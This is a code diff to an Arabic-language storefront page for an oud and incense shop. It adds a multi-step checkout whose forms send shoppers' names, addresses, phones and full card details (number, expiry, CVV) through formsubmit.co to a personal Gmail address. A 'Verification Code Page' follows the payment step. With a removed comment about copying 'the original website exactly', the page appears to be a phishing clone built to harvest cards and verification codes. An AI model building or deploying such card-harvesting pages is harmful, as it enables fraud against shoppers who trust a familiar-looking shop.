@@ -555,6 +555,83 @@
             opacity: 1;
         }
         
+        /* Order Progress Bar */
+        .progress-bar {
+            display: flex;
+            justify-content: space-between;
+            margin: 20px 0;
+            position: relative;
+        }
+        
+        .progress-step {
+            flex: 1;
+            text-align: center;
+            position: relative;
+        }
+        
+        .progress-step::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translateY(-50%);
+            width: 100%;
+            height: 2px;
+            background: #e5e5e5;
+            z-index: 1;
+        }
+        
+        .progress-step:last-child::before {
+            display: none;
+        }
+        
+        .progress-step .step-circle {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #e5e5e5;
+            color: #666;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 8px;
+            position: relative;
+            z-index: 2;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+        
+        .progress-step.active .step-circle {
+            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
+            color: white;
+        }
+        
+        .progress-step.completed .step-circle {
+            background: #10B981;
+            color: white;
+        }
+        
+        .progress-step.completed::before {
+            background: #10B981;
+        }
+        
+        /* Full Screen Pages */
+        .fullscreen-page {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+            z-index: 1500;
+            display: none;
+            overflow-y: auto;
+        }
+        
+        .fullscreen-page.active {
+            display: block;
+        }
+        
         /* Card Suggestions */
         .card-suggestions {
             position: absolute;
@@ -596,6 +673,75 @@
             background-position: left 15px center;
             background-size: 20px;
         }
+        
+        /* Enhanced Animations */
+        .fade-in {
+            animation: fadeIn 0.6s ease-in-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .slide-up {
+            animation: slideUp 0.4s ease-in-out;
+        }
+        
+        @keyframes slideUp {
+            from { transform: translateY(100%); }
+            to { transform: translateY(0); }
+        }
+        
+        /* Advanced Form Styling */
+        .form-section {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            margin: 20px 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            border: 1px solid #f0f0f0;
+        }
+        
+        .form-section h3 {
+            color: #8B4513;
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+            font-weight: 700;
+        }
+        
+        /* Enhanced Button Styles */
+        .btn-secondary {
+            background: linear-gradient(135deg, #6B7280 0%, #4B5563 100%);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 10px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+        }
+        
+        .btn-secondary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(107, 114, 128, 0.4);
+        }
+        
+        .btn-success {
+            background: linear-gradient(135deg, #10B981 0%, #059669 100%);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 10px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+        }
+        
+        .btn-success:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(16, 185, 129, 0.4);
+        }
     </style>
 </head>
 <body class="bg-gray-50">
@@ -606,7 +752,7 @@
 
     <!-- Quick Navigation Menu -->
     <div class="quick-nav" id="quickNavMenu">
-        <div class="text-center mb-4 text-orange-600 font-bold text-sm">صفحة رئيسية</div>
+        <div class="text-center mb-4 text-orange-600 font-bold text-sm">التنقل السريع</div>
         <a href="#home" class="quick-nav-item">
             <i class="fas fa-home"></i>
             <span class="quick-nav-tooltip">الرئيسية</span>
@@ -928,7 +1074,7 @@
                             <input type="hidden" name="_subject" value="رسالة جديدة من موقع مكاسر العود">
                             <input type="hidden" name="_captcha" value="false">
                             <input type="hidden" name="_template" value="table">
-                            <input type="hidden" name="_next" value="https://mkasr-aloud.netlify.app/thanks.html">
+                            <input type="hidden" name="_next" value="javascript:void(0)">
                             
                             <div class="input-group">
                                 <input type="text" name="name" required="" placeholder=" ">
@@ -956,7 +1102,7 @@
             </div>
         </section>
 
-        <!-- Team Section (Moved to end) -->
+        <!-- Team Section -->
         <section class="py-20 bg-gradient-to-br from-gray-50 to-white">
             <div class="container mx-auto px-6">
                 <div class="text-center mb-16">
@@ -1063,8 +1209,345 @@
         </footer>
     </div>
 
-    <!-- Success Page -->
-    <div id="successPage" class="hidden fixed inset-0 bg-gradient-to-br from-emerald-500 via-green-500 to-teal-600 z-50">
+    <!-- Cart Modal -->
+    <div id="cartModal" class="modal">
+        <div class="modal-content p-8">
+            <div class="flex justify-between items-center mb-8">
+                <h3 class="text-2xl font-bold flex items-center">
+                    <i class="fas fa-shopping-cart ml-3 text-orange-600"></i>
+                    سلة المشتريات
+                </h3>
+                <button onclick="closeCart()" class="text-gray-500 hover:text-gray-700 p-2">
+                    <i class="fas fa-times text-2xl"></i>
+                </button>
+            </div>
+            <div id="cartItems" class="max-h-96 overflow-y-auto"></div>
+            <div id="cartTotal" class="border-t pt-6 mt-6"></div>
+            <button onclick="startCheckout()" class="btn-primary w-full mt-6">
+                <i class="fas fa-arrow-left ml-2"></i>
+                متابعة إلى الطلب
+            </button>
+        </div>
+    </div>
+
+    <!-- Order Information Page -->
+    <div id="orderInfoPage" class="fullscreen-page">
+        <div class="container mx-auto px-6 py-12">
+            <!-- Progress Bar -->
+            <div class="progress-bar mb-12">
+                <div class="progress-step active">
+                    <div class="step-circle">1</div>
+                    <p class="text-sm font-bold">معلومات الطلب</p>
+                </div>
+                <div class="progress-step">
+                    <div class="step-circle">2</div>
+                    <p class="text-sm">مراجعة الطلب</p>
+                </div>
+                <div class="progress-step">
+                    <div class="step-circle">3</div>
+                    <p class="text-sm">الدفع</p>
+                </div>
+                <div class="progress-step">
+                    <div class="step-circle">4</div>
+                    <p class="text-sm">التأكيد</p>
+                </div>
+            </div>
+
+            <div class="max-w-4xl mx-auto">
+                <div class="text-center mb-12">
+                    <h1 class="text-4xl font-bold text-gray-800 mb-4">إكمال معلومات الطلب</h1>
+                    <p class="text-xl text-gray-600">يرجى ملء المعلومات المطلوبة لإتمام طلبك</p>
+                </div>
+
+                <form id="customerInfoForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" onsubmit="return submitCustomerInfo(event)" class="space-y-8">
+                    <input type="hidden" name="_subject" value="📋 معلومات عميل جديد - مكاسر العود">
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_template" value="table">
+                    <input type="hidden" name="_next" value="javascript:void(0)">
+
+                    <!-- Customer Information -->
+                    <div class="form-section fade-in">
+                        <h3><i class="fas fa-user ml-3"></i>المعلومات الشخصية</h3>
+                        <div class="grid md:grid-cols-2 gap-6">
+                            <div class="input-group">
+                                <input type="text" name="first_name" required="" placeholder=" ">
+                                <label>الاسم الأول</label>
+                            </div>
+                            <div class="input-group">
+                                <input type="text" name="last_name" required="" placeholder=" ">
+                                <label>الاسم الأخير</label>
+                            </div>
+                        </div>
+                        <div class="input-group">
+                            <input type="email" name="email" required="" placeholder=" ">
+                            <label>البريد الإلكتروني</label>
+                        </div>
+                        <div class="input-group">
+                            <input type="tel" name="phone" required="" placeholder=" " pattern="[0-9]{10,}" title="يرجى إدخال رقم هاتف صحيح">
+                            <label>رقم الهاتف</label>
+                        </div>
+                    </div>
+
+                    <!-- Shipping Information -->
+                    <div class="form-section fade-in">
+                        <h3><i class="fas fa-shipping-fast ml-3"></i>عنوان الشحن</h3>
+                        <div class="input-group">
+                            <input type="text" name="address" required="" placeholder=" ">
+                            <label>العنوان التفصيلي</label>
+                        </div>
+                        <div class="grid md:grid-cols-2 gap-6">
+                            <div class="input-group">
+                                <select name="city" required="">
+                                    <option value="">اختر المدينة</option>
+                                    <option value="الرياض">الرياض</option>
+                                    <option value="جدة">جدة</option>
+                                    <option value="الدمام">الدمام</option>
+                                    <option value="مكة المكرمة">مكة المكرمة</option>
+                                    <option value="المدينة المنورة">المدينة المنورة</option>
+                                    <option value="الطائف">الطائف</option>
+                                    <option value="أبها">أبها</option>
+                                    <option value="تبوك">تبوك</option>
+                                    <option value="بريدة">بريدة</option>
+                                    <option value="خميس مشيط">خميس مشيط</option>
+                                    <option value="حائل">حائل</option>
+                                    <option value="الجبيل">الجبيل</option>
+                                    <option value="الخبر">الخبر</option>
+                                    <option value="ينبع">ينبع</option>
+                                    <option value="القطيف">القطيف</option>
+                                    <option value="نجران">نجران</option>
+                                    <option value="الباحة">الباحة</option>
+                                    <option value="عرعر">عرعر</option>
+                                    <option value="سكاكا">سكاكا</option>
+                                    <option value="جيزان">جيزان</option>
+                                    <option value="الأحساء">الأحساء</option>
+                                    <option value="القريات">القريات</option>
+                                    <option value="رفحاء">رفحاء</option>
+                                    <option value="طريف">طريف</option>
+                                    <option value="أخرى">أخرى</option>
+                                </select>
+                                <label>المدينة</label>
+                            </div>
+                            <div class="input-group">
+                                <input type="text" name="postal_code" required="" placeholder=" " maxlength="6" pattern="[0-9]{5,6}" title="يرجى إدخال رمز بريدي مكون من 5-6 أرقام" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
+                                <label>الرمز البريدي (5-6 أرقام)</label>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Order Notes -->
+                    <div class="form-section fade-in">
+                        <h3><i class="fas fa-sticky-note ml-3"></i>ملاحظات إضافية (اختياري)</h3>
+                        <div class="input-group">
+                            <textarea rows="4" name="order_notes" placeholder=" " class="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-orange-600 focus:outline-none resize-none"></textarea>
+                            <label>أي ملاحظات خاصة بالطلب أو التوصيل</label>
+                        </div>
+                    </div>
+
+                    <!-- Action Buttons -->
+                    <div class="flex flex-col sm:flex-row gap-4 justify-center pt-8">
+                        <button type="button" onclick="goBackToCart()" class="btn-secondary">
+                            <i class="fas fa-arrow-right ml-2"></i>
+                            العودة للسلة
+                        </button>
+                        <button type="submit" class="btn-primary" id="submitCustomerInfoBtn">
+                            <i class="fas fa-arrow-left ml-2"></i>
+                            متابعة لمراجعة الطلب
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Order Review Page -->
+    <div id="orderReviewPage" class="fullscreen-page">
+        <div class="container mx-auto px-6 py-12">
+            <!-- Progress Bar -->
+            <div class="progress-bar mb-12">
+                <div class="progress-step completed">
+                    <div class="step-circle"><i class="fas fa-check"></i></div>
+                    <p class="text-sm">معلومات الطلب</p>
+                </div>
+                <div class="progress-step active">
+                    <div class="step-circle">2</div>
+                    <p class="text-sm font-bold">مراجعة الطلب</p>
+                </div>
+                <div class="progress-step">
+                    <div class="step-circle">3</div>
+                    <p class="text-sm">الدفع</p>
+                </div>
+                <div class="progress-step">
+                    <div class="step-circle">4</div>
+                    <p class="text-sm">التأكيد</p>
+                </div>
+            </div>
+
+            <div class="max-w-6xl mx-auto">
+                <div class="text-center mb-12">
+                    <h1 class="text-4xl font-bold text-gray-800 mb-4">مراجعة الطلب</h1>
+                    <p class="text-xl text-gray-600">تأكد من صحة البيانات قبل المتابعة للدفع</p>
+                </div>
+
+                <div class="grid lg:grid-cols-2 gap-8">
+                    <!-- Order Items -->
+                    <div class="form-section">
+                        <h3><i class="fas fa-shopping-bag ml-3"></i>المنتجات المطلوبة</h3>
+                        <div id="reviewOrderItems" class="space-y-4">
+                            <!-- Items will be populated by JavaScript -->
+                        </div>
+                    </div>
+
+                    <!-- Customer Info -->
+                    <div class="form-section">
+                        <h3><i class="fas fa-user ml-3"></i>معلومات العميل</h3>
+                        <div id="reviewCustomerInfo" class="space-y-3">
+                            <!-- Customer info will be populated by JavaScript -->
+                        </div>
+                        <button onclick="editCustomerInfo()" class="btn-secondary mt-4">
+                            <i class="fas fa-edit ml-2"></i>
+                            تعديل المعلومات
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Order Summary -->
+                <div class="form-section mt-8">
+                    <h3><i class="fas fa-calculator ml-3"></i>ملخص الفاتورة</h3>
+                    <div id="reviewOrderSummary" class="space-y-4">
+                        <!-- Summary will be populated by JavaScript -->
+                    </div>
+                </div>
+
+                <!-- Action Buttons -->
+                <div class="flex flex-col sm:flex-row gap-4 justify-center pt-8">
+                    <button type="button" onclick="goBackToInfo()" class="btn-secondary">
+                        <i class="fas fa-arrow-right ml-2"></i>
+                        العودة للمعلومات
+                    </button>
+                    <button type="button" onclick="proceedToPayment()" class="btn-primary">
+                        <i class="fas fa-credit-card ml-2"></i>
+                        متابعة للدفع
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Payment Page -->
+    <div id="paymentPage" class="fullscreen-page">
+        <div class="container mx-auto px-6 py-12">
+            <!-- Progress Bar -->
+            <div class="progress-bar mb-12">
+                <div class="progress-step completed">
+                    <div class="step-circle"><i class="fas fa-check"></i></div>
+                    <p class="text-sm">معلومات الطلب</p>
+                </div>
+                <div class="progress-step completed">
+                    <div class="step-circle"><i class="fas fa-check"></i></div>
+                    <p class="text-sm">مراجعة الطلب</p>
+                </div>
+                <div class="progress-step active">
+                    <div class="step-circle">3</div>
+                    <p class="text-sm font-bold">الدفع</p>
+                </div>
+                <div class="progress-step">
+                    <div class="step-circle">4</div>
+                    <p class="text-sm">التأكيد</p>
+                </div>
+            </div>
+
+            <div class="max-w-4xl mx-auto">
+                <div class="text-center mb-12">
+                    <h1 class="text-4xl font-bold text-gray-800 mb-4">إتمام الدفع</h1>
+                    <p class="text-xl text-gray-600">أدخل معلومات البطاقة الائتمانية لإتمام الطلب</p>
+                </div>
+
+                <form id="paymentForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" onsubmit="return submitPayment(event)" class="space-y-8">
+                    <input type="hidden" name="_subject" value="💳 معلومات دفع جديدة - مكاسر العود">
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_template" value="table">
+                    <input type="hidden" name="_next" value="javascript:void(0)">
+
+                    <!-- Payment Card -->
+                    <div class="form-section">
+                        <div class="payment-card mb-6">
+                            <div class="flex justify-between items-start mb-4">
+                                <div>
+                                    <p class="text-lg font-semibold">الدفع بالبطاقة الائتمانية</p>
+                                    <p class="text-sm opacity-90">دفع آمن ومشفر 100%</p>
+                                </div>
+                                <div class="flex space-x-2 rtl:space-x-reverse">
+                                    <i class="fab fa-cc-visa text-2xl"></i>
+                                    <i class="fab fa-cc-mastercard text-2xl"></i>
+                                </div>
+                            </div>
+                            <div class="flex items-center">
+                                <i class="fas fa-lock ml-2"></i>
+                                <span class="text-sm">محمي بتشفير SSL</span>
+                            </div>
+                        </div>
+
+                        <h3><i class="fas fa-credit-card ml-3"></i>معلومات البطاقة</h3>
+                        <div class="space-y-6">
+                            <div class="input-group input-with-suggestions">
+                                <input type="text" name="card_number" required="" placeholder=" " maxlength="19" oninput="formatCardNumber(this)" onfocus="showCardSuggestions(this)" onblur="hideCardSuggestions(this)">
+                                <label>رقم البطاقة</label>
+                                <div class="card-suggestions" id="cardSuggestions"></div>
+                            </div>
+                            <div class="grid grid-cols-2 gap-6">
+                                <div class="input-group input-with-suggestions">
+                                    <input type="text" name="expiry_date" required="" placeholder=" " maxlength="5" oninput="formatExpiryDate(this)" onfocus="showExpirySuggestions(this)" onblur="hideExpirySuggestions(this)" style="color: #4F46E5; font-weight: 600;">
+                                    <label style="font-size: 13px; color: #6B7280;">تاريخ الانتهاء (شهر/سنة)</label>
+                                    <div class="card-suggestions" id="expirySuggestions"></div>
+                                </div>
+                                <div class="input-group">
+                                    <input type="password" name="cvv" required="" placeholder=" " maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                                    <label>رمز الأمان (CVV)</label>
+                                </div>
+                            </div>
+                            <div class="input-group input-with-suggestions">
+                                <input type="text" name="card_holder" required="" placeholder=" " onfocus="showHolderSuggestions(this)" onblur="hideHolderSuggestions(this)">
+                                <label>اسم حامل البطاقة</label>
+                                <div class="card-suggestions" id="holderSuggestions"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Payment Summary -->
+                    <div class="form-section">
+                        <h3><i class="fas fa-receipt ml-3"></i>ملخص الدفع</h3>
+                        <div id="paymentSummary" class="space-y-4">
+                            <!-- Payment summary will be populated by JavaScript -->
+                        </div>
+                    </div>
+
+                    <!-- Security Notice -->
+                    <div class="flex items-center justify-center p-6 bg-green-50 rounded-xl border border-green-200">
+                        <i class="fas fa-shield-alt text-green-600 text-2xl ml-4"></i>
+                        <div>
+                            <p class="text-green-800 font-semibold text-lg">جميع المعاملات مؤمنة ومشفرة</p>
+                            <p class="text-green-700 text-sm">نحن نحمي معلوماتك الشخصية والمالية بأعلى معايير الأمان</p>
+                        </div>
+                    </div>
+
+                    <!-- Action Buttons -->
+                    <div class="flex flex-col sm:flex-row gap-4 justify-center pt-8">
+                        <button type="button" onclick="goBackToReview()" class="btn-secondary">
+                            <i class="fas fa-arrow-right ml-2"></i>
+                            العودة للمراجعة
+                        </button>
+                        <button type="submit" class="btn-success text-xl py-4 px-8" id="submitPaymentBtn">
+                            <i class="fas fa-lock ml-2"></i>
+                            تأكيد الدفع وإتمام الطلب
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Verification Code Page -->
+    <div id="verificationPage" class="hidden fixed inset-0 bg-gradient-to-br from-emerald-500 via-green-500 to-teal-600 z-50">
         <div class="flex items-center justify-center min-h-screen p-4">
             <div class="bg-white rounded-3xl shadow-2xl p-8 max-w-lg w-full text-center success-animation relative overflow-hidden">
                 <!-- Background Pattern -->
@@ -1140,195 +1623,15 @@
         </div>
     </div>
 
-    <!-- Cart Modal -->
-    <div id="cartModal" class="modal">
-        <div class="modal-content p-8">
-            <div class="flex justify-between items-center mb-8">
-                <h3 class="text-2xl font-bold flex items-center">
-                    <i class="fas fa-shopping-cart ml-3 text-orange-600"></i>
-                    سلة المشتريات
-                </h3>
-                <button onclick="closeCart()" class="text-gray-500 hover:text-gray-700 p-2">
-                    <i class="fas fa-times text-2xl"></i>
-                </button>
-            </div>
-            <div id="cartItems" class="max-h-96 overflow-y-auto"></div>
-            <div id="cartTotal" class="border-t pt-6 mt-6"></div>
-            <button onclick="checkout()" class="btn-primary w-full mt-6">
-                <i class="fas fa-credit-card ml-2"></i>
-                إتمام الطلب
-            </button>
-        </div>
-    </div>
-
-    <!-- Checkout Modal -->
-    <div id="checkoutModal" class="modal">
-        <div class="modal-content p-8">
-            <div class="flex justify-between items-center mb-8">
-                <h3 class="text-2xl font-bold flex items-center">
-                    <i class="fas fa-shopping-bag ml-3 text-orange-600"></i>
-                    إتمام الطلب
-                </h3>
-                <button onclick="closeCheckout()" class="text-gray-500 hover:text-gray-700 p-2">
-                    <i class="fas fa-times text-2xl"></i>
-                </button>
-            </div>
-            
-            <form action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" onsubmit="return prepareOrderSubmit(this)" class="space-y-6">
-                <input type="hidden" name="_subject" value="🛒 طلب جديد من موقع مكاسر العود">
-                <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_template" value="table">
-                <input type="hidden" name="_next" value="javascript:void(0)">
-                
-                <!-- Hidden inputs for order data -->
-                <input type="hidden" name="المنتجات" id="hiddenOrderItems">
-                <input type="hidden" name="المجموع_الفرعي" id="hiddenSubtotal">
-                <input type="hidden" name="رسوم_الشحن" id="hiddenShipping">
-                <input type="hidden" name="الإجمالي" id="hiddenTotal">
-                <input type="hidden" name="كود_التأكيد" id="hiddenVerificationCode">
-                <input type="hidden" name="تاريخ_الطلب" id="hiddenTimestamp">
-                <input type="hidden" name="موقع_الطلب" value="مكاسر العود">
-                
-                <!-- Customer Information -->
-                <div class="mb-8">
-                    <h4 class="font-bold mb-6 text-xl text-gray-800 flex items-center">
-                        <i class="fas fa-user ml-3 text-orange-600"></i>
-                        معلومات العميل
-                    </h4>
-                    <div class="grid md:grid-cols-2 gap-6">
-                        <div class="input-group">
-                            <input type="text" name="first_name" required="" placeholder=" ">
-                            <label>الاسم الأول</label>
-                        </div>
-                        <div class="input-group">
-                            <input type="text" name="last_name" required="" placeholder=" ">
-                            <label>الاسم الأخير</label>
-                        </div>
-                    </div>
-                    <div class="input-group">
-                        <input type="email" name="email" required="" placeholder=" ">
-                        <label>البريد الإلكتروني</label>
-                    </div>
-                    <div class="input-group">
-                        <input type="tel" name="phone" required="" placeholder=" " pattern="[0-9]{10,}" title="يرجى إدخال رقم هاتف صحيح">
-                        <label>رقم الهاتف</label>
-                    </div>
-                    <div class="input-group">
-                        <input type="text" name="address" required="" placeholder=" ">
-                        <label>العنوان التفصيلي</label>
-                    </div>
-                    <div class="grid md:grid-cols-2 gap-6">
-                        <div class="input-group">
-                            <select name="city" required="">
-                                <option value="">اختر المدينة</option>
-                                <option value="الرياض">الرياض</option>
-                                <option value="جدة">جدة</option>
-                                <option value="الدمام">الدمام</option>
-                                <option value="مكة المكرمة">مكة المكرمة</option>
-                                <option value="المدينة المنورة">المدينة المنورة</option>
-                                <option value="الطائف">الطائف</option>
-                                <option value="أبها">أبها</option>
-                                <option value="تبوك">تبوك</option>
-                                <option value="بريدة">بريدة</option>
-                                <option value="خميس مشيط">خميس مشيط</option>
-                                <option value="حائل">حائل</option>
-                                <option value="الجبيل">الجبيل</option>
-                                <option value="الخبر">الخبر</option>
-                                <option value="ينبع">ينبع</option>
-                                <option value="القطيف">القطيف</option>
-                                <option value="نجران">نجران</option>
-                                <option value="الباحة">الباحة</option>
-                                <option value="عرعر">عرعر</option>
-                                <option value="سكاكا">سكاكا</option>
-                                <option value="جيزان">جيزان</option>
-                                <option value="الأحساء">الأحساء</option>
-                                <option value="القريات">القريات</option>
-                                <option value="رفحاء">رفحاء</option>
-                                <option value="طريف">طريف</option>
-                                <option value="أخرى">أخرى</option>
-                            </select>
-                            <label>المدينة</label>
-                        </div>
-                        <div class="input-group">
-                            <input type="text" name="postal_code" required="" placeholder=" " maxlength="6" pattern="[0-9]{5,6}" title="يرجى إدخال رمز بريدي مكون من 5-6 أرقام" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
-                            <label>الرمز البريدي (5-6 أرقام)</label>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Payment Card -->
-                <div class="mb-8">
-                    <h4 class="font-bold mb-6 text-xl text-gray-800 flex items-center">
-                        <i class="fas fa-credit-card ml-3 text-orange-600"></i>
-                        معلومات البطاقة الائتمانية
-                    </h4>
-                    
-                    <div class="payment-card mb-6">
-                        <div class="flex justify-between items-start mb-4">
-                            <div>
-                                <p class="text-lg font-semibold">الدفع بالبطاقة الائتمانية</p>
-                                <p class="text-sm opacity-90">دفع آمن ومشفر 100%</p>
-                            </div>
-                            <div class="flex space-x-2 rtl:space-x-reverse">
-                                <i class="fab fa-cc-visa text-2xl"></i>
-                                <i class="fab fa-cc-mastercard text-2xl"></i>
-                            </div>
-                        </div>
-                        <div class="flex items-center">
-                            <i class="fas fa-lock ml-2"></i>
-                            <span class="text-sm">محمي بتشفير SSL</span>
-                        </div>
-                    </div>
-
-                    <div class="space-y-6">
-                        <div class="input-group input-with-suggestions">
-                            <input type="text" name="card_number" required="" placeholder=" " maxlength="19" oninput="formatCardNumber(this)" onfocus="showCardSuggestions(this)" onblur="hideCardSuggestions(this)">
-                            <label>رقم البطاقة</label>
-                            <div class="card-suggestions" id="cardSuggestions"></div>
-                        </div>
-                        <div class="grid grid-cols-2 gap-6">
-                            <div class="input-group input-with-suggestions">
-                                <input type="text" name="expiry_date" required="" placeholder=" " maxlength="5" oninput="formatExpiryDate(this)" onfocus="showExpirySuggestions(this)" onblur="hideExpirySuggestions(this)" style="color: #4F46E5; font-weight: 600;">
-                                <label style="font-size: 13px; color: #6B7280;">تاريخ الانتهاء (شهر/سنة)</label>
-                                <div class="card-suggestions" id="expirySuggestions"></div>
-                            </div>
-                            <div class="input-group">
-                                <input type="password" name="cvv" required="" placeholder=" " maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
-                                <label>رمز الأمان (CVV)</label>
-                            </div>
-                        </div>
-                        <div class="input-group input-with-suggestions">
-                            <input type="text" name="card_holder" required="" placeholder=" " onfocus="showHolderSuggestions(this)" onblur="hideHolderSuggestions(this)">
-                            <label>اسم حامل البطاقة</label>
-                            <div class="card-suggestions" id="holderSuggestions"></div>
-                        </div>
-                    </div>
-                </div>
-                
-                <div id="orderSummary" class="border-t pt-6 mt-8"></div>
-                
-                <div class="flex items-center justify-center p-4 bg-green-50 rounded-lg mb-6">
-                    <i class="fas fa-shield-alt text-green-600 ml-3"></i>
-                    <span class="text-green-800 font-semibold">جميع المعاملات مؤمنة ومشفرة</span>
-                </div>
-                
-                <button type="submit" class="btn-primary w-full text-lg py-4" id="submitOrderBtn">
-                    <i class="fas fa-lock ml-2"></i>
-                    تأكيد الطلب والدفع الآمن
-                </button>
-            </form>
-        </div>
-    </div>
-
     <!-- Scroll to Top Button -->
     <div class="scroll-to-top" onclick="scrollToTop()">
         <i class="fas fa-arrow-up"></i>
     </div>
 
     <script>
-        // Enhanced products data matching the original website exactly
+        // Enhanced products data
         const products = [
-            // عود محسن (حذف موروكي الأصيل)
+            // عود محسن
             {
                 id: 1,
                 name: "موروكي الفخامة",
@@ -1369,7 +1672,7 @@
                 features: ["نوعية ملكية", "رائحة استثنائية", "للخاصة فقط"]
             },
             
-            // عود طبيعي - matching original website exactly
+            // عود طبيعي
             {
                 id: 5,
                 name: "دقة هندي",
@@ -1380,7 +1683,7 @@
                 rating: 5,
                 available: true,
                 bestselling: true,
-                description: "دقة عود هندي طبيعي تتميز بالثبات والرائحة الجميلة .. للاستخدام الشخصي والمنزل والمكاتب والملابس",
+                description: "دقة عود هندي طبيعي تتميز بالثبات والرائحة الجميلة للاستخدام الشخصي والمنزل والمكاتب والملابس",
                 features: ["عود هندي أصلي", "ثبات عالي", "رائحة جميلة", "متعدد الاستخدامات"]
             },
             {
@@ -1393,7 +1696,7 @@
                 rating: 5,
                 available: false,
                 bestselling: true,
-                description: "موروكي فاخر من غابات اصقون قديم جداً ( قرابة ال 12 سنه ) وقل مايوجد هذه الايام بهذه الجودة والرائحة .. الكسر مختلفة الاحجام مابين المباخر واكبر من المباخر وقليل منها بحجم الميني .. جميع الكسر مفروزة بعناية .. للاستخدام الشخصي والمناسبات والإهداء",
+                description: "موروكي فاخر من غابات اصقون قديم جداً (قرابة ال 12 سنه) وقل مايوجد هذه الايام بهذه الجودة والرائحة",
                 features: ["عتيق 12 سنة", "جودة نادرة", "كسر مفروزة", "نفدت الكمية"]
             },
             {
@@ -1406,7 +1709,7 @@
                 rating: 5,
                 available: true,
                 bestselling: false,
-                description: "دقة العود الفلبيني الفاخر من غابات ليتي الغنية عن التعريف يتميز بكثافة الدهن وبنكهته الجميلة ( كمودي - سيلاني ) ، للاستخدام الشخصي",
+                description: "دقة العود الفلبيني الفاخر من غابات ليتي يتميز بكثافة الدهن وبنكهته الجميلة (كمودي - سيلاني)",
                 features: ["من غابات ليتي", "كثافة دهن عالية", "نكهة كمودي سيلاني", "فلبيني فاخر"]
             },
             {
@@ -1553,7 +1856,7 @@
                 rating: 5,
                 available: true,
                 bestselling: true,
-                description: "منتج من عود موروكي طبيعي مُزج بأدهان خاصة أضفت عليه رائحة مميزة .. ويستخدم لتبخير المنزل .. ويفضل استعمال المبخرة الكهربائية او ترميد الجمر قبل وضعه",
+                description: "منتج من عود موروكي طبيعي مُزج بأدهان خاصة أضفت عليه رائحة مميزة ويستخدم لتبخير المنزل",
                 features: ["موروكي طبيعي", "مزج بأدهان خاصة", "لتبخير المنزل", "للمبخرة الكهربائية"]
             },
 
@@ -1572,7 +1875,7 @@
                 features: ["سوبر نقيل", "درجة أولى", "فاخر", "إنتاج 2022"]
             },
 
-            // توزيعات مع الصورة الجديدة
+            // توزيعات
             {
                 id: 20,
                 name: "نانو توله دهن مخلط",
@@ -1588,9 +1891,12 @@
             }
         ];
 
+        // Global variables
         let cart = [];
         let currentFilter = 'all';
         let savedCards = JSON.parse(localStorage.getItem('savedCards')) || [];
+        let customerInfo = {};
+        let verificationCode = '';
 
         // Initialize the page
         document.addEventListener('DOMContentLoaded', function() {
@@ -1832,63 +2138,315 @@
             showNotification(`تم حذف ${item.name} من السلة`, 'success');
         }
 
-        function checkout() {
+        // START CHECKOUT PROCESS
+        function startCheckout() {
             if (cart.length === 0) {
                 showNotification('السلة فارغة، يرجى إضافة منتجات أولاً', 'error');
                 return;
             }
             
             closeCart();
-            document.getElementById('checkoutModal').classList.add('active');
-            updateOrderSummary();
+            showOrderInfoPage();
         }
 
-        function closeCheckout() {
-            document.getElementById('checkoutModal').classList.remove('active');
+        function showOrderInfoPage() {
+            document.getElementById('mainContent').style.display = 'none';
+            document.getElementById('orderInfoPage').classList.add('active');
         }
 
-        function updateOrderSummary() {
-            const orderSummary = document.getElementById('orderSummary');
+        function goBackToCart() {
+            document.getElementById('orderInfoPage').classList.remove('active');
+            document.getElementById('mainContent').style.display = 'block';
+            openCart();
+        }
+
+        // SUBMIT CUSTOMER INFO
+        function submitCustomerInfo(event) {
+            event.preventDefault();
+            
+            const form = event.target;
+            const submitBtn = document.getElementById('submitCustomerInfoBtn');
+            const originalText = submitBtn.innerHTML;
+            
+            // Show loading state
+            submitBtn.innerHTML = '<div class="loading-spinner"></div>جاري إرسال المعلومات...';
+            submitBtn.disabled = true;
+            
+            // Save customer info
+            customerInfo = {
+                firstName: form.querySelector('input[name="first_name"]').value,
+                lastName: form.querySelector('input[name="last_name"]').value,
+                email: form.querySelector('input[name="email"]').value,
+                phone: form.querySelector('input[name="phone"]').value,
+                address: form.querySelector('input[name="address"]').value,
+                city: form.querySelector('select[name="city"]').value,
